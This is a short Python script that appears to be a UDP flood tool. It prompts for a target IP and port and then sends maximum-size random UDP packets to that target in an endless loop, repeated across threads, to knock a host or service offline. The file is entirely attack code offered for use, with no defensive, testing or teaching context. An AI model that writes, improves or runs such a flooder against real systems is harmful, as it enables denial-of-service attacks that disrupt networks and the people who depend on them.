import os
import sys
import socket
import random
import threading

ip = input("ip: ")
port = int(input("port: "))
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
bytes = random._urandom(65507)
randport = (True,False)[port==0]
port = (random.randint(1,65535),port)[randport]
on = True

def main():
    count = 0
    while on:
        count += 8
        print(":", count, "udp packets sent.", end="\r")
        try:
            sock.sendto(bytes, (ip, port))
            sock.sendto(bytes, (ip, port))
            sock.sendto(bytes, (ip, port))
            sock.sendto(bytes, (ip, port))
            sock.sendto(bytes, (ip, port))
            sock.sendto(bytes, (ip, port))
            sock.sendto(bytes, (ip, port))
            sock.sendto(bytes, (ip, port))
        except KeyboardInterrupt:
            sys.exit(0)
main()

while on:
    run = threading.Thread(target = main)
    run.start()